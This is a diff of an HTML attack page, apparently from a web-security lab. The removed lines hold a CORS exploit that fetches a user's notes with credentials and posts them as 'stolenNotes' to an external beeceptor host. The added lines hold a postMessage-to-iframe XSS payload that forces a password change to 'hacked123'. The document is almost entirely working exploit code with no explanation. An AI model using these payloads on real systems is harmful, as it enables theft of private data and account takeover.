@@ -1,28 +1,16 @@
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CORS</title>
-</head>
+<html>
 <body>
-  <h2>Not so private Notes</h2>
-  
-  <script>
-fetch('https://localhost/get-notes', {
-    method: 'GET',
-    credentials: 'include'
-})
-.then(response => response.json())
-.then(data => {
-    fetch('https://fadsf.free.beeceptor.com/exfil', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ stolenNotes: data.notes })
-    });
-});
-  </script>
+<iframe id="f"
+  src="https://eb9f-2a01-9700-3547-8500-501c-6512-c767-68d.ngrok-free.app/">
+</iframe>
+<script>
+  document.getElementById('f').onload = function () {
+    document.getElementById('f').contentWindow.postMessage({
+      type: 'alert',
+      content: '<img src=x onerror="fetch(\'/change-password\',{method:\'POST\',headers:{\'Content-Type\':\'application/x-www-form-urlencoded\'},body:\'new_password=hacked123\'})">'
+    }, '*');
+  };
+</script>
 </body>
 </html>
